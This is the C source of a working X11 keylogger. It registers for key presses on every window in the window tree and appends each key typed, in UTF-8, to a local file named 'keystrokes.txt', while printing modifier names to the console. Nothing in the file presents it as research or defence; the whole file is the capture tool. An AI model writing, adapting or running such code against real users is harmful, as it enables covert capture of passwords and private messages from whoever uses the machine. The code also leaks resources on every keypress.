#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <assert.h>

#include <X11/X.h>
#include <X11/Xlib.h>
#include <X11/XKBlib.h>
#include <X11/keysymdef.h>
#include <X11/keysym.h>
#include <X11/extensions/XI.h>
#include <X11/extensions/XInput2.h>
#include <X11/Intrinsic.h>
#include <X11/StringDefs.h>
#include <X11/Xutil.h>
#include <X11/Shell.h>


void traverse_window_tree(Display *dpy, Window root) {

    Window parent, *children;
    uint32_t nchildren;

    XSelectInput(dpy, root, KeyPressMask);

    XQueryTree(dpy, root, &root, &parent, &children, &nchildren);

    for (size_t i=0; i < nchildren; ++i) {
        traverse_window_tree(dpy, children[i]);
    }

}




char* get_utf8_key(Display *dpy, KeySym keysym) {

    XIM xim = XOpenIM(dpy, 0, 0, 0);
    XIC xic = XCreateIC(xim,
                        XNInputStyle,
                        XIMPreeditNothing | XIMStatusNothing,
                        NULL);

    XKeyPressedEvent keypressed_event;
    keypressed_event.type    = KeyPress;
    keypressed_event.display = dpy;
    keypressed_event.state   = 0;
    keypressed_event.keycode = XKeysymToKeycode(dpy, keysym);

    size_t size = 32;
    char *buf = calloc(size, sizeof(char));
    KeySym ignore;
    Status return_status;
    Xutf8LookupString(xic, &keypressed_event, buf, size, &ignore, &return_status);

    return buf;

}




int main(void) {

    Display *dpy = XOpenDisplay(NULL);
    assert(dpy != NULL);

    Window root = DefaultRootWindow(dpy);

    FILE *log_file = fopen("keystrokes.txt", "a");
    assert(log_file != NULL);

    while (1) {
        traverse_window_tree(dpy, root);

        XEvent event = { 0 };
        XNextEvent(dpy, &event);

        if (event.type == KeyPress) {

            int state = event.xkey.state;

            switch (state) {
                case ShiftMask: {
                    puts("shift");
                } break;
                case ControlMask: {
                    puts("ctrl");
                } break;
                case Mod1Mask: {
                    puts("meta");
                } break;
                case Mod4Mask: {
                    puts("super");
                } break;
                case LockMask: {
                    puts("lock");
                } break;
                case Mod2Mask: {
                    puts("mod2");
                } break;
            }

            KeySym k = XLookupKeysym(&event.xkey, state == ShiftMask ? 1 : 0);
            // char *s = XKeysymToString(k);
            // printf("%s\n", s);

            char *key_str = get_utf8_key(dpy, k);
            printf("%s\n", key_str);
            fprintf(log_file, "%s\n", key_str);

        }

    }

    fclose(log_file);



    XCloseDisplay(dpy);

    return EXIT_SUCCESS;

}
